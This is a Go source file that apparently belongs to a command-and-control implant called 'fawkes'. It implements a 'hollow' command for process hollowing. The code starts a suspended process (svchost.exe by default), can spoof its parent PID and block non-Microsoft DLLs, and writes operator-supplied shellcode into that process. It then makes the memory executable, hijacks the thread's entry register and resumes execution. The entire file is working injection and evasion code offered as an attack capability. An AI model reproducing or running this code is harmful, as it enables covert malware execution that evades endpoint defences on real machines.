//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
)

type HollowingCommand struct{}

func (c *HollowingCommand) Name() string { return "hollow" }
func (c *HollowingCommand) Description() string {
	return "Process hollowing — create suspended process and redirect execution to shellcode (T1055.012)"
}

type hollowParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	Target       string `json:"target"`
	Ppid         int    `json:"ppid"`
	BlockDLLs    bool   `json:"block_dlls"`
}

// procVirtualProtectExHollow avoids conflict with retpatch.go's procVirtualProtect
var procVirtualProtectExHollow = kernel32.NewProc("VirtualProtectEx")

func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required",
			Status:    "error",
			Completed: true,
		}
	}

	var params hollowParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: shellcode_b64 is required",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: shellcode is empty",
			Status:    "error",
			Completed: true,
		}
	}

	if params.Target == "" {
		params.Target = `C:\Windows\System32\svchost.exe`
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	output, err := performHollowing(shellcode, params)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("\n[!] Hollowing failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

func performHollowing(shellcode []byte, params hollowParams) (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] Process Hollowing\n")
	sb.WriteString(fmt.Sprintf("[*] Target: %s\n", params.Target))
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))

	// Step 1: Create suspended process
	sb.WriteString("[*] Creating suspended process...\n")

	targetUTF16, err := syscall.UTF16PtrFromString(params.Target)
	if err != nil {
		return sb.String(), fmt.Errorf("invalid target path: %v", err)
	}

	var si syscall.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi syscall.ProcessInformation

	createFlags := uint32(CREATE_SUSPENDED | CREATE_NEW_CONSOLE)

	// PPID spoofing / DLL blocking via extended attributes
	if params.Ppid > 0 || params.BlockDLLs {
		createFlags |= EXTENDED_STARTUPINFO_PRESENT

		attrCount := uint32(0)
		if params.Ppid > 0 {
			attrCount++
		}
		if params.BlockDLLs {
			attrCount++
		}

		// Get required buffer size
		var size uintptr
		procInitializeProcThreadAttributeList.Call(0, uintptr(attrCount), 0, uintptr(unsafe.Pointer(&size)))
		listBuf := make([]byte, size)
		attrList := (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(&listBuf[0]))
		ret, _, _ := procInitializeProcThreadAttributeList.Call(
			uintptr(unsafe.Pointer(attrList)), uintptr(attrCount), 0, uintptr(unsafe.Pointer(&size)),
		)
		if ret == 0 {
			return sb.String(), fmt.Errorf("InitializeProcThreadAttributeList failed")
		}

		if params.Ppid > 0 {
			parentHandle, _, openErr := procOpenProcess.Call(
				uintptr(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION),
				0, uintptr(params.Ppid),
			)
			if parentHandle == 0 {
				return sb.String(), fmt.Errorf("open parent PID %d: %v", params.Ppid, openErr)
			}
			defer procCloseHandle.Call(parentHandle)

			ret, _, _ = procUpdateProcThreadAttribute.Call(
				uintptr(unsafe.Pointer(attrList)), 0,
				uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
				uintptr(unsafe.Pointer(&parentHandle)), unsafe.Sizeof(parentHandle), 0, 0,
			)
			if ret == 0 {
				return sb.String(), fmt.Errorf("UpdateProcThreadAttribute (PPID) failed")
			}
			sb.WriteString(fmt.Sprintf("[*] PPID spoofing: %d\n", params.Ppid))
		}

		if params.BlockDLLs {
			policy := uint64(PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
			ret, _, _ = procUpdateProcThreadAttribute.Call(
				uintptr(unsafe.Pointer(attrList)), 0,
				uintptr(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
				uintptr(unsafe.Pointer(&policy)), unsafe.Sizeof(policy), 0, 0,
			)
			if ret == 0 {
				return sb.String(), fmt.Errorf("UpdateProcThreadAttribute (BlockDLLs) failed")
			}
			sb.WriteString("[*] Non-Microsoft DLL blocking enabled\n")
		}

		// Build STARTUPINFOEXW with attribute list
		type startupInfoExW struct {
			StartupInfo   syscall.StartupInfo
			AttributeList *PROC_THREAD_ATTRIBUTE_LIST
		}
		siex := startupInfoExW{StartupInfo: si, AttributeList: attrList}
		siex.StartupInfo.Cb = uint32(unsafe.Sizeof(siex))

		ret, _, lastErr := procCreateProcessW.Call(
			0, uintptr(unsafe.Pointer(targetUTF16)),
			0, 0, 0, uintptr(createFlags),
			0, 0,
			uintptr(unsafe.Pointer(&siex.StartupInfo)),
			uintptr(unsafe.Pointer(&pi)),
		)
		if ret == 0 {
			return sb.String(), fmt.Errorf("CreateProcessW failed: %v", lastErr)
		}
	} else {
		err = syscall.CreateProcess(
			targetUTF16, nil, nil, nil, false,
			createFlags, nil, nil, &si, &pi,
		)
		if err != nil {
			return sb.String(), fmt.Errorf("CreateProcess failed: %v", err)
		}
	}
	defer syscall.CloseHandle(pi.Process)
	defer syscall.CloseHandle(pi.Thread)

	sb.WriteString(fmt.Sprintf("[+] Created suspended process PID: %d, TID: %d\n", pi.ProcessId, pi.ThreadId))

	// Step 2: Allocate RW memory in the new process
	sb.WriteString(fmt.Sprintf("[*] Allocating %d bytes in target process...\n", len(shellcode)))

	remoteAddr, _, allocErr := procVirtualAllocEx.Call(
		uintptr(pi.Process), 0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if remoteAddr == 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("VirtualAllocEx failed: %v", allocErr)
	}
	sb.WriteString(fmt.Sprintf("[+] Allocated memory at 0x%X\n", remoteAddr))

	// Step 3: Write shellcode
	sb.WriteString("[*] Writing shellcode...\n")

	var bytesWritten uintptr
	ret, _, writeErr := procWriteProcessMemory.Call(
		uintptr(pi.Process), remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("WriteProcessMemory failed: %v", writeErr)
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes\n", bytesWritten))

	// Step 4: Change memory protection to RX
	var oldProtect uint32
	ret, _, protErr := procVirtualProtectExHollow.Call(
		uintptr(pi.Process), remoteAddr,
		uintptr(len(shellcode)),
		uintptr(PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("VirtualProtectEx failed: %v", protErr)
	}
	sb.WriteString("[+] Memory protection set to RX\n")

	// Step 5: Get thread context
	sb.WriteString("[*] Getting thread context...\n")

	ctx := CONTEXT_AMD64{}
	ctx.ContextFlags = 0x10001B // CONTEXT_FULL

	ret, _, ctxErr := procGetThreadContext.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx)),
	)
	if ret == 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("GetThreadContext failed: %v", ctxErr)
	}

	sb.WriteString(fmt.Sprintf("[+] Original RCX (entry point): 0x%X\n", ctx.Rcx))

	// Step 6: Set RCX to shellcode address
	// On x64 CREATE_SUSPENDED, the initial thread's RCX register contains
	// the entry point. Overwriting it redirects execution to our shellcode.
	ctx.Rcx = uint64(remoteAddr)

	ret, _, ctxErr = procSetThreadContext.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx)),
	)
	if ret == 0 {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("SetThreadContext failed: %v", ctxErr)
	}
	sb.WriteString(fmt.Sprintf("[+] Set RCX to shellcode at 0x%X\n", remoteAddr))

	// Step 7: Resume the thread
	sb.WriteString("[*] Resuming thread...\n")

	ret, _, resumeErr := procResumeThread.Call(uintptr(pi.Thread))
	if ret == ^uintptr(0) {
		_ = syscall.TerminateProcess(pi.Process, 1)
		return sb.String(), fmt.Errorf("ResumeThread failed: %v", resumeErr)
	}

	sb.WriteString("[+] Thread resumed successfully\n")
	sb.WriteString(fmt.Sprintf("[+] Process hollowing complete — PID %d running shellcode\n", pi.ProcessId))

	return sb.String(), nil
}

